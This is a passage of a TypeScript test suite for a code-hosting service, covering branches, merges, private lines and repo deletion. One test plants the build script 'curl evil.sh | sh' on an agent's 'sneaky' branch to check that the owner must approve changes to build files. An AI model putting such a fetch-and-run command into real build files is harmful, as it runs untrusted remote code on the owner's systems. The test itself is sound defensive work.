    await post(call, "agent-a", "/api/repos/ana/r/branches", { name: "feat/x" });
    const b = encodeURIComponent("feat/x"), q = `?path=a.js&branch=${b}`;
    await post(call, "agent-a", "/api/repos/ana/r/files", { path: "src/new.js", content: "fresh", branch: "feat/x" });
    await call("agent-a", `/api/repos/ana/r/branches/${b}/files?path=src/b.js`, { method: "DELETE" });
    const tree = async (dir: string, branch?: string) => ((await (await call("ana", `/api/repos/ana/r/tree?path=${dir}${branch ? `&branch=${branch}` : ""}`)).json()) as any).entries.map((e: any) => e.path).sort();
    expect(await tree("src")).toEqual(["src/b.js"]);
    expect(await tree("src", b)).toEqual(["src/new.js"]);
    expect(await tree("", b)).toEqual(["a.js", "src"]);

    // Two stretches changed in a.js: the review has them as hunks, and the reviewer rejects the second.
    expect((await post(call, "agent-a", `/api/repos/ana/r/do/ops${q}`, { ops: [{ kind: "set", line: "L1", base: 1, text: "ONE" }, { kind: "delete", line: "L4", base: 4 }] })).status).toBe(200);
    const review = await (await call("ana", `/api/repos/ana/r/branches/${b}`)).json() as any;
    const a = review.files.find((f: any) => f.path === "a.js");
    expect(a.hunks.map((h: any) => [h.key, h.del.map((l: any) => l.text), h.add.map((l: any) => l.text)])).toEqual([["L1", ["one"], ["ONE"]], ["L4", ["four"], []]]);
    expect(review.files.find((f: any) => f.path === "src/new.js").hunks).toMatchObject([{ add: [{ text: "fresh" }] }]);
    const reject = (user: string, key: string) => post(call, user, `/api/repos/ana/r/branches/${b}/hunks/reject`, { path: "a.js", key });
    expect((await reject("bo", "L4")).status).toBe(403);
    expect((await reject("ana", "L9")).status).toBe(404);
    expect((await reject("ana", "L4")).status).toBe(200);
    expect(text(await (await call("ana", `/api/repos/ana/r/do/file${q}`)).json() as Doc)).toBe("ONE\ntwo\nthree\nfour");
    expect(((await (await call("ana", `/api/repos/ana/r/branches/${b}/hunks?path=a.js`)).json()) as any).hunks.map((h: any) => h.key)).toEqual(["L1"]);
    // Merged, main gets the hunk that stayed.
    expect((await post(call, "ana", `/api/repos/ana/r/branches/${b}/merge`, {})).status).toBe(200);
    expect(text(await (await call("ana", "/api/repos/ana/r/do/file?path=a.js")).json() as Doc)).toBe("ONE\ntwo\nthree\nfour");
  });

  test("on a branch that deleted every file of a folder git has, the folder goes too (#745)", async () => {
    const call = await local();
    await post(call, "ana", "/api/login", { name: "ana" });
    await post(call, "ana", "/api/repos", { name: "r" });
    for (const path of ["a.js", "src/deep/b.js"]) {
      await post(call, "ana", "/api/repos/ana/r/files", { path, content: "x" });
      expect((await post(call, "ana", `/api/repos/ana/r/do/commit?path=${encodeURIComponent(path)}`, { message: "add" })).status).toBe(200);
    }
    await post(call, "ana", "/api/repos/ana/r/branches", { name: "tidy" });
    const tree = async (branch?: string) => ((await (await call("ana", `/api/repos/ana/r/tree?path=${branch ? `&branch=${branch}` : ""}`)).json()) as any).entries.map((e: any) => e.path).sort();
    expect(await tree("tidy")).toEqual(["a.js", "src"]);
    await call("ana", "/api/repos/ana/r/branches/tidy/files?path=src/deep/b.js", { method: "DELETE" });
    expect(await tree("tidy")).toEqual(["a.js"]);
    expect(await tree()).toEqual(["a.js", "src"]);
    // A file written on the branch under it brings it back.
    await post(call, "ana", "/api/repos/ana/r/files", { path: "src/c.js", content: "y", branch: "tidy" });
    expect(await tree("tidy")).toEqual(["a.js", "src"]);
  });

  test("a merge with a conflict lands nothing until each line is settled", async () => {
    const call = await local();
    await post(call, "ana", "/api/login", { name: "ana" });
    await post(call, "ana", "/api/repos", { name: "r" });
    await post(call, "ana", "/api/repos/ana/r/files", { path: "a.js", content: "x\ny" });
    await post(call, "ana", "/api/repos/ana/r/files", { path: "b.js", content: "z" });
    await post(call, "ana", "/api/repos/ana/r/branches", { name: "b1" });
    const opsOn = (query: string, o: unknown[]) => post(call, "ana", `/api/repos/ana/r/do/ops${query}`, { ops: o });
    await opsOn("?path=a.js&branch=b1", [{ kind: "set", line: "L1", base: 1, text: "branch" }]);
    await opsOn("?path=b.js&branch=b1", [{ kind: "set", line: "L1", base: 1, text: "Z" }]);
    await opsOn("?path=a.js", [{ kind: "set", line: "L1", base: 1, text: "main" }]);

    const r = await post(call, "ana", "/api/repos/ana/r/branches/b1/merge", {});
    expect(r.status).toBe(409);
    expect((await r.json() as any).conflicts).toEqual([{ path: "a.js", leftover: "person", conflicts: [{ line: "L1", base: "x", main: "main", branch: "branch", choices: ["main", "branch", "both", "both:branch-first", "text"] }] }]);
    // Not even the clean file landed.
    expect(text(await (await call("ana", "/api/repos/ana/r/do/file?path=b.js")).json() as Doc)).toBe("z");
    expect((await post(call, "ana", "/api/repos/ana/r/branches/b1/merge", { resolve: { "a.js": { L1: "branch" } } })).status).toBe(200);
    expect(text(await (await call("ana", "/api/repos/ana/r/do/file?path=a.js")).json() as Doc)).toBe("branch\ny");
    expect(text(await (await call("ana", "/api/repos/ana/r/do/file?path=b.js")).json() as Doc)).toBe("Z");
  });

  test("a merge that would leave code that doesn't build waits, and says why", async () => {
    const call = await local();
    await post(call, "ana", "/api/login", { name: "ana" });
    await post(call, "ana", "/api/repos", { name: "r" });
    await post(call, "ana", "/api/repos/ana/r/files", { path: "a.ts", content: "const x = 1;\nlog(x);" });
    await post(call, "ana", "/api/repos/ana/r/branches", { name: "b1" });
    const opsOn = (query: string, o: unknown[]) => post(call, "ana", `/api/repos/ana/r/do/ops${query}`, { ops: o });
    // Each side declares the same new name in a different place: each builds alone, merged it's declared twice.
    await opsOn("?path=a.ts&branch=b1", [{ kind: "insert", after: null, text: "const y = 2;" }]);
    await opsOn("?path=a.ts", [{ kind: "insert", after: "L2", text: "const y = 3;" }]);
    const review = await (await call("ana", "/api/repos/ana/r/branches/b1")).json() as any;
    expect(review.files[0].conflicts).toEqual([{ line: "lint:redeclared:y", base: "", main: null, branch: null, lint: "`y` is declared twice (line 4)", choices: ["main", "branch"] }]);
    const r = await post(call, "ana", "/api/repos/ana/r/branches/b1/merge", {});
    expect(r.status).toBe(409);
    expect((await r.json() as any).error).toBe("merged, it wouldn't build: a.ts: `y` is declared twice (line 4)");
    expect(text(await (await call("ana", "/api/repos/ana/r/do/file?path=a.ts")).json() as Doc)).toBe("const x = 1;\nlog(x);\nconst y = 3;");
    expect((await post(call, "ana", "/api/repos/ana/r/branches/b1/merge", { resolve: { "a.ts": { "lint:redeclared:y": "branch" } } })).status).toBe(200);
  });

  test("marking an already committed line private takes its text out of search at once", async () => {
    const call = await local();
    await post(call, "ana", "/api/repos", { name: "pub" });
    await post(call, "ana", "/api/repos/ana/pub/files", { path: "a.ts", content: "one\nkey = hunter2\nthree" });
    await post(call, "ana", "/api/repos/ana/pub/do/commit?path=a.ts", { message: "c" });
    expect((await (await call("bo", "/api/search?q=hunter2")).json() as any[]).length).toBe(1);
    expect((await post(call, "ana", "/api/repos/ana/pub/do/private?path=a.ts", { lines: ["L2"], private: true })).status).toBe(200);
    expect(await (await call("bo", "/api/search?q=hunter2")).json()).toEqual([]);
    expect((await (await call("bo", "/api/search?q=three")).json() as any[]).length).toBe(1);
  });

  test("marking an already committed line private blanks it in public git HEAD at once, keeping uncommitted edits out", async () => {
    const call = await local();
    await post(call, "ana", "/api/repos", { name: "pub" });
    await post(call, "ana", "/api/repos/ana/pub/files", { path: "a.ts", content: "one\nkey = hunter2\nthree" });
    await post(call, "ana", "/api/repos/ana/pub/do/commit?path=a.ts", { message: "c" });
    const repo = await call.artifacts.get("ana--pub");
    expect(await (await repo.readFile({ ref: "main", path: "a.ts" }))!.text()).toContain("hunter2");
    // An edit nobody committed yet stays out of git.
    await post(call, "ana", "/api/repos/ana/pub/do/ops?path=a.ts", { ops: [{ kind: "set", line: "L3", base: 3, text: "draft" }] });
    expect((await post(call, "ana", "/api/repos/ana/pub/do/private?path=a.ts", { lines: ["L2"], private: true })).status).toBe(200);
    expect(await (await repo.readFile({ ref: "main", path: "a.ts" }))!.text()).toBe("one\n\nthree\n");
    // The crew's remote still has the real text.
    const crew = await call.artifacts.get("ana--pub--crew");
    expect(await (await crew.readFile({ ref: "main", path: "a.ts" }))!.text()).toBe("one\nkey = hunter2\nthree\n");
  });

  test("private lines in a public repo: the crew reads them, everyone else, git and search get them blank", async () => {
    const call = await local();
    await post(call, "ana", "/api/repos", { name: "pub" });
    await post(call, "ana", "/api/repos/ana/pub/collaborators", { name: "agent-a" });
    await post(call, "ana", "/api/repos/ana/pub/files", { path: "a.ts", content: "one\nkey = hunter2\nthree" });
    const on = "/api/repos/ana/pub/do", q = "?path=a.ts";
    const read = async (who: string | null, route = "file", query = q) => (await (await call(who, `${on}/${route}${query}`)).json()) as any;
    const mark = (who: string, lines: string[], private_ = true) => post(call, who, `${on}/private${q}`, { lines, private: private_ });

    expect((await mark("bo", ["L2"])).status).toBe(403);
    expect((await post(call, "ana", `${on}/private${q}&branch=x`, { lines: ["L2"], private: true })).status).toBe(404);
    expect((await mark("ana", ["L2"])).status).toBe(200);
    // Outside the crew: a placeholder, in its place.
    expect((await read("bo")).lines.map((l: any) => [l.id, l.text, !!l.private])).toEqual([["L1", "one", false], ["L2", "", true], ["L3", "three", false]]);
    expect((await read(null)).lines[1].text).toBe("");
    expect((await read("agent-a")).lines[1]).toMatchObject({ text: "key = hunter2", private: true });

    // Edited, it stays private, and blame and time travel don't give it away.
    await post(call, "ana", `${on}/ops${q}`, { ops: [{ kind: "set", line: "L2", base: 2, text: "key = hunter3" }] });
    expect((await read("ana")).lines[1]).toMatchObject({ text: "key = hunter3", private: true });
    expect(JSON.stringify([await read("bo", "log"), await read("bo", "at", q + "&rev=3")])).not.toContain("hunter");

    // Git and search get the blank line; the crew still reads the real one.
    expect((await post(call, "ana", `${on}/commit${q}`, { message: "c" })).status).toBe(200);
    const repo = await call.artifacts.get("ana--pub");
    expect(await (await repo.readFile({ ref: "main", path: "a.ts" }))!.text()).toBe("one\n\nthree\n");
    // The crew's own remote has the real text, and only the crew is handed its clone line; deploys clone it.
    const crew = await call.artifacts.get("ana--pub--crew");
    expect(await (await crew.readFile({ ref: "main", path: "a.ts" }))!.text()).toBe("one\nkey = hunter3\nthree\n");
    const info = async (who: string) => (await (await call(who, "/api/repos/ana/pub")).json()) as any;
    expect((await info("agent-a")).crewClone).toContain("ana--pub--crew");
    expect([(await info("bo")).crewClone, (await info("bo")).clone]).toEqual([null, expect.not.stringContaining("--crew")]);
    const { remoteFor } = await import("../src/deploy.ts");
    expect(await remoteFor(call.env as any, "ana", "pub")).toContain("ana--pub--crew");
    expect(await (await call("ana", "/api/search?q=hunter3")).json()).toEqual([]);
    expect((await (await call("ana", "/api/search?q=three")).json() as any[]).length).toBe(1);

    // Shares and playlists read it as their reader may.
    const { id } = await (await post(call, "ana", "/api/repos/ana/pub/shares", { path: "a.ts", from: 1, to: 3 })).json() as any;
    expect((await (await call(null, `/api/shares/${id}`)).json() as any).lines.map((l: any) => l.text)).toEqual(["one", "", "three"]);
    const pl = await (await post(call, "bo", "/api/playlists", { title: "mine" })).json() as any;
    await post(call, "bo", `/api/playlists/${pl.id}/tracks`, { owner: "ana", repo: "pub", path: "a.ts", from: 1, to: 3 });
    expect((await (await call("bo", `/api/playlists/${pl.id}`)).json() as any).tracks[0].lines.map((l: any) => l.text)).toEqual(["one", "", "three"]);

    // A branch's copy hides the same lines, and lines marked after it forked.
    await post(call, "agent-a", "/api/repos/ana/pub/branches", { name: "b" });
    await post(call, "agent-a", `${on}/ops${q}&branch=b`, { ops: [{ kind: "set", line: "L2", base: 4, text: "key = hunter4" }] });
    await mark("ana", ["L1"]);
    expect((await read("bo", "file", q + "&branch=b")).lines.map((l: any) => l.text)).toEqual(["", "", "three"]);
    const review = await (await call("bo", "/api/repos/ana/pub/branches/b")).json() as any;
    expect(JSON.stringify(review)).not.toContain("hunter");
    expect(JSON.stringify(await (await call("ana", "/api/repos/ana/pub/branches/b")).json())).toContain("hunter4");

    // Public again.
    await mark("ana", ["L1", "L2"], false);
    expect((await read("bo")).lines.map((l: any) => l.text)).toEqual(["one", "key = hunter3", "three"]);
  });

  test("a crew remote made after private lines were pushed blank gets their real text (#341)", async () => {
    const call = await local();
    await post(call, "ana", "/api/repos", { name: "old" });
    const on = "/api/repos/ana/old/do";
    await post(call, "ana", "/api/repos/ana/old/files", { path: "a.ts", content: "one\nkey = hunter2" });
    await post(call, "ana", "/api/repos/ana/old/files", { path: "b.ts", content: "b\nsecret = 1" });
    await post(call, "ana", `${on}/private?path=a.ts`, { lines: ["L2"], private: true });
    await post(call, "ana", `${on}/commit?path=a.ts`, { message: "a" });
    // A repo from before the crew remote: its git has a.ts blank, and no crew remote.
    await call.artifacts.delete!("ana--old--crew");
    await call.env.DB.prepare("UPDATE repos SET crew_artifact = NULL, crew_remote = NULL WHERE owner = 'ana' AND name = 'old'").run();
    // Each repo is real git behind a local HTTP server; on a busy runner a pushed file can take a moment to show.
    const read = async (name: string, path: string) => {
      for (let i = 0; i < 40; i++) {
        const file = await (await call.artifacts.get(name)).readFile({ ref: "main", path });
        if (file) return file.text();
        await Bun.sleep(50);
      }
      throw new Error(`${name}:${path} never appeared on main`);
    };
    expect(await read("ana--old", "a.ts")).toBe("one\n");

    // Marking a line private makes the crew remote and tries the backfill; git fails it once.
    const get = call.artifacts.get.bind(call.artifacts);
    let fail = true;
    call.artifacts.get = async (name: string) => {
      const h = await get(name);
      if (name !== "ana--old--crew") return h;
      const createToken = h.createToken.bind(h);
      return Object.assign(h, { createToken: async (...a: Parameters<typeof createToken>) => { if (fail) { fail = false; throw new Error("git is away"); } return createToken(...a); } });
    };
    await post(call, "ana", `${on}/private?path=b.ts`, { lines: ["L2"], private: true });
    const owed = async () => (await call.env.DB.prepare("SELECT crew_backfill FROM repos WHERE owner = 'ana' AND name = 'old'").first() as any).crew_backfill;
    expect([await read("ana--old--crew", "a.ts"), await owed()]).toEqual(["one\n", 1]);

    // The next commit, of any file, pays it: one commit of the real text, then its own.
    await post(call, "ana", "/api/repos/ana/old/files", { path: "c.ts", content: "c" });
    await post(call, "ana", `${on}/commit?path=c.ts`, { message: "c" });
    expect([await read("ana--old--crew", "a.ts"), await owed()]).toEqual(["one\nkey = hunter2\n", null]);
    await post(call, "ana", `${on}/commit?path=b.ts`, { message: "b" });
    expect([await read("ana--old--crew", "b.ts"), await read("ana--old", "a.ts"), await read("ana--old", "b.ts")]).toEqual(["b\nsecret = 1\n", "one\n", "b\n"]);
    const log = await (await call.artifacts.get("ana--old--crew")).log({ ref: "main", limit: 3 });
    expect(log.map((c: any) => c.message.trim())).toEqual(["b", "c", "Private lines' real text: a.ts"]);

    // A crew remote made before the backfill existed: a bare fork, a.ts blank, nothing owed. The migration flags it.
    call.artifacts.get = get;
    await call.artifacts.delete!("ana--old--crew");
    const fork = await (await get("ana--old")).fork("ana--old--crew", { defaultBranchOnly: true });
    await call.env.DB.prepare("UPDATE repos SET crew_remote = ? WHERE owner = 'ana' AND name = 'old'").bind(fork.remote).run();
    expect([await read("ana--old--crew", "a.ts"), await owed()]).toEqual(["one\n", null]);
    const sql = await Bun.file(new URL("../migrations/0034_crew_backfill_old.sql", import.meta.url)).text();
    await call.env.DB.prepare(sql.match(/^UPDATE .*;$/m)![0]).run();
    await post(call, "ana", `${on}/ops?path=c.ts`, { ops: [{ kind: "insert", after: "L1", text: "d" }] });
    await post(call, "ana", `${on}/commit?path=c.ts`, { message: "c2" });
    expect([await read("ana--old--crew", "a.ts"), await read("ana--old--crew", "b.ts"), await owed()]).toEqual(["one\nkey = hunter2\n", "b\nsecret = 1\n", null]);
  });

  test("a branch that changes build or deploy files says so, and a merge that would ship waits for the owner to read it", async () => {
    const call = await local();
    await post(call, "ana", "/api/login", { name: "ana" });
    await post(call, "ana", "/api/repos", { name: "r" });
    await post(call, "ana", "/api/repos/ana/r/collaborators", { name: "agent-a" });
    await post(call, "ana", "/api/repos/ana/r/files", { path: "package.json", content: '{\n  "scripts": { "build": "vite build" }\n}' });
    await post(call, "agent-a", "/api/repos/ana/r/branches", { name: "sneaky" });
    await post(call, "agent-a", "/api/repos/ana/r/do/ops?path=package.json&branch=sneaky", { ops: [{ kind: "set", line: "L2", base: 2, text: '  "scripts": { "build": "curl evil.sh | sh" }' }] });
    await post(call, "agent-a", "/api/repos/ana/r/files", { path: "src/a.js", content: "fine", branch: "sneaky" });

    const review = await (await call("ana", "/api/repos/ana/r/branches/sneaky")).json() as any;
    expect(review.deploys).toBe(false);
    expect(review.files.map((f: any) => [f.path, f.build])).toEqual([["package.json", true], ["src/a.js", false]]);
    expect(review.files[0].lines).toEqual(['-   "scripts": { "build": "vite build" }', '+   "scripts": { "build": "curl evil.sh | sh" }']);
    expect(review.files[1].lines).toBeUndefined();

    // Once the owner's commit to main ships, the merge needs build_ok.
    expect((await call("ana", "/api/repos/ana/r/deploy", { method: "PUT", body: JSON.stringify({ on_commit: true }) })).status).toBe(200);
    expect((await (await call("ana", "/api/repos/ana/r/branches/sneaky")).json() as any).deploys).toBe(true);
    const no = await post(call, "ana", "/api/repos/ana/r/branches/sneaky/merge", {});
    expect(no.status).toBe(409);
    expect((await no.json() as any).build).toEqual(["package.json"]);
    // The author's own build_ok is no read: only the owner's, or another member's, counts.
    expect((await post(call, "agent-a", "/api/repos/ana/r/branches/sneaky/merge", { build_ok: true })).status).toBe(409);
    expect(text(await (await call("ana", "/api/repos/ana/r/do/file?path=package.json")).json() as Doc)).toContain("vite build");
    // build_ok is a person reading the files: the owner's own API token can't say it.
    const tok = await (await post(call, "ana", "/api/tokens", { label: "agent", scope: "admin" })).json() as { token: string };
    const viaToken = await call(null, "/api/repos/ana/r/branches/sneaky/merge", { method: "POST", headers: { authorization: `Bearer ${tok.token}` }, body: JSON.stringify({ build_ok: true }) });
    expect(viaToken.status).toBe(403);
    expect((await post(call, "ana", "/api/repos/ana/r/branches/sneaky/merge", { build_ok: true })).status).toBe(200);
    expect(text(await (await call("ana", "/api/repos/ana/r/do/file?path=package.json")).json() as Doc)).toContain("curl evil.sh");
  });

  test("build and deploy files are told apart from the rest", () => {
    for (const p of ["package.json", "web/package.json", "bun.lock", "pnpm-lock.yaml", "rustybuns.config.ts", "wrangler.jsonc", ".rustybuns/state.json", "alchemy.run.ts", "Dockerfile", "api/Dockerfile.prod", "build.ts", "vite.config.mjs", ".github/workflows/ci.yml", ".gitlab-ci.yml", "codesplitter.ci", ".gitattributes"]) expect([p, isBuildFile(p)]).toEqual([p, true]);
    for (const p of ["src/build.tsx", "README.md", "src/package.ts", "docs/wrangler.md", "test/vite.config.test.ts"]) expect([p, isBuildFile(p)]).toEqual([p, false]);
  });

  test("the owner flips a repo public or private", async () => {
    const call = await local();
    await post(call, "ana", "/api/repos", { name: "dig", visibility: "private" });
    const put = (who: string, v: string) => call(who, "/api/repos/ana/dig", { method: "PUT", body: JSON.stringify({ visibility: v }) });
    expect((await call("bo", "/api/repos/ana/dig")).status).toBe(404);
    expect((await put("bo", "public")).status).toBe(404);
    expect((await put("ana", "public")).status).toBe(200);
    expect((await call("bo", "/api/repos/ana/dig")).status).toBe(200);
  });

  test("the owner deletes a repo, once its name is typed back: rows, files, branches, cuts, shares and git", async () => {
    const call = await local();
    await post(call, "ana", "/api/repos", { name: "gone" });
    await post(call, "ana", "/api/repos/ana/gone/collaborators", { name: "agent-a" });
    await post(call, "ana", "/api/repos/ana/gone/files", { path: "a.ts", content: "export const one = 1;\nexport const two = one + 1;\n" });
    await post(call, "ana", "/api/repos/ana/gone/do/commit?path=a.ts", { message: "first" });
    await post(call, "ana", "/api/repos/ana/gone/branches", { name: "tidy" });
    const share = (await (await post(call, "ana", "/api/repos/ana/gone/shares", { path: "a.ts", from: 1, to: 2 })).json()) as any;
    const cut = await post(call, "ana", "/api/repos/ana/gone/cuts", { pieces: [{ path: "a.ts", from: 2, to: 2 }] });
    expect(cut.status).toBe(201);
    const { artifact } = (await call.env.DB.prepare("SELECT artifact FROM repos WHERE owner = 'ana' AND name = 'gone'").first()) as any;
    expect(artifact).toBeTruthy();

    const del = (who: string, q = "?confirm=gone") => call(who, `/api/repos/ana/gone${q}`, { method: "DELETE" });
    expect((await del("agent-a")).status).toBe(403);   // crew can't
    expect((await del("bo")).status).toBe(403);
    expect((await del("ana", "")).status).toBe(400);   // not without its name
    expect((await del("ana", "?confirm=other")).status).toBe(400);
    expect(await (await del("ana")).json()).toEqual({ deleted: "ana/gone" });

    expect((await call("ana", "/api/repos/ana/gone")).status).toBe(404);
    expect((await call(null, `/api/shares/${share.id}`)).status).toBe(404);
    for (const t of ["files", "branches", "branch_files", "collaborators", "shares", "cuts", "repo_search"]) {
      expect(await call.env.DB.prepare(`SELECT count(*) AS n FROM ${t} WHERE owner = 'ana' AND repo = 'gone'`).first()).toEqual({ n: 0 });
    }
    // The name is free again, and starts empty: the file's Durable Object was wiped, and the git went too.
    expect((await post(call, "ana", "/api/repos", { name: "gone" })).status).toBe(201);
    expect(((await (await call("ana", "/api/repos/ana/gone/do/file?path=a.ts")).json()) as any).lines ?? []).toEqual([]);
    expect(((await (await call("ana", "/api/repos/ana/gone/tree")).json()) as any).entries).toEqual([]);
  });
});
